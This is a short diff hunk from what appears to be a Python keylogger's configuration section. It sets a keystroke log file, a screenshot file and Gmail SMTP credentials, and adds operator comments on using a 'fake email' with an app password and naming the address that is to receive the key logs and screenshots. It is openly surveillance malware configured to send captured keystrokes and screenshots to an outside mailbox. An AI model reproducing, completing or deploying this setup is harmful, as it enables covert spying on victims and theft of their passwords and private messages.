@@ -13,11 +13,11 @@ LOG_INTERVAL = 60  # in seconds
 LOG_FILE = "keylog_file.txt"
 SCREENSHOT_NAME = "screenshot.png"
 
-EMAIL_ADDRESS = "sender@gmail.com"
-EMAIL_PASSWORD = "16_digit_app_password"
+EMAIL_ADDRESS = "sender@gmail.com"         # ADD YOUR FAKE EMAIL, ENABLE 2 FACTOR AUTHENTICATION
+EMAIL_PASSWORD = "16_digit_app_password"   # TYPE 16 DIGIT APP PASSWORD 
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
-RECIPIENT_EMAIL = "Receiver@gmail.com"
+RECIPIENT_EMAIL = "Receiver@gmail.com"     # TYPE RECIEVER EMAIL WHERE YOU WANT TO RECEIVE KEY LOGS AND SCREENSHOTS
 
 # ===== LOGGING SETUP =====
 logging.basicConfig(
